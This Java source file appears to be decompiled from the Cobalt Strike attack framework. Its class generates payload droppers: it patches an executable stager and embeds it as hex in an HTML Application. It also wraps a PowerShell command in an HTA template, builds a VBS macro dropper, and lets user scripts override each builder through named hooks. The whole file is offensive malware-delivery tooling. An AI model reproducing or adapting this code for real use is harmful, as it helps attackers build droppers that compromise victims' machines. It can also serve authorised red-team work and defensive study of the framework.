package common;

import aggressor.AggressorClient;

import java.util.Stack;

import sleep.runtime.SleepUtils;

public class MutantResourceUtils {

    protected AggressorClient client;

    public MutantResourceUtils(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public byte[] getScriptedResource(String string, Stack stack) {
        String str = this.client.getScriptEngine().format(string, stack);
        return (str == null) ? new byte[0] : CommonUtils.toBytes(str);
    }

    public byte[] getScriptedResource(String string1, byte[] arrby, String string2) {
        Stack stack = new Stack();
        stack.push(SleepUtils.getScalar(string2));
        stack.push(SleepUtils.getScalar(arrby));
        return getScriptedResource(string1, stack);
    }

    public byte[] getScriptedResource(String string, byte[] arrby) {
        Stack stack = new Stack();
        stack.push(SleepUtils.getScalar(arrby));
        return getScriptedResource(string, stack);
    }

    public byte[] buildHTMLApplicationEXE(byte[] arrby, String string) {
        byte[] arrby1 = (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact32.exe");
        byte[] arrby2 = getScriptedResource("HTMLAPP_EXE", arrby1, string);
        return (arrby2.length == 0) ? _buildHTMLApplicationEXE(arrby1, string) : arrby2;
    }

    public byte[] _buildHTMLApplicationEXE(byte[] arrby, String string) {
        String str = CommonUtils.bString(CommonUtils.readResource("resources/htmlapp.txt"));
        str = CommonUtils.strrep(str, "##EXE##", ArtifactUtils.toHex(arrby));
        str = CommonUtils.strrep(str, "##NAME##", string);
        return CommonUtils.toBytes(str);
    }

    public byte[] buildHTMLApplicationPowerShell(byte[] arrby) {
        byte[] arrby1 = (new PowerShellUtils(this.client)).buildPowerShellCommand(arrby);
        byte[] arrby2 = getScriptedResource("HTMLAPP_POWERSHELL", arrby1);
        return (arrby2.length == 0) ? _buildHTMLApplicationPowerShell(arrby1) : arrby2;
    }

    public byte[] _buildHTMLApplicationPowerShell(byte[] arrby) {
        String str = CommonUtils.bString(CommonUtils.readResource("resources/htmlapp2.txt"));
        str = CommonUtils.strrep(str, "%%DATA%%", CommonUtils.bString(arrby));
        return CommonUtils.toBytes(str);
    }

    public byte[] buildVBS(byte[] arrby) {
        byte[] arrby1 = (new ResourceUtils(this.client)).buildMacro(arrby);
        byte[] arrby2 = getScriptedResource("RESOURCE_GENERATOR_VBS", arrby1);
        return (arrby2.length == 0) ? _buildVBS(arrby1) : arrby2;
    }

    public byte[] _buildVBS(byte[] arrby) {
        String str = CommonUtils.bString(CommonUtils.readResource("resources/template.vbs")).trim();
        str = CommonUtils.strrep(str, "$$CODE$$", ArtifactUtils.toVBS(arrby));
        return CommonUtils.toBytes(str);
    }
}
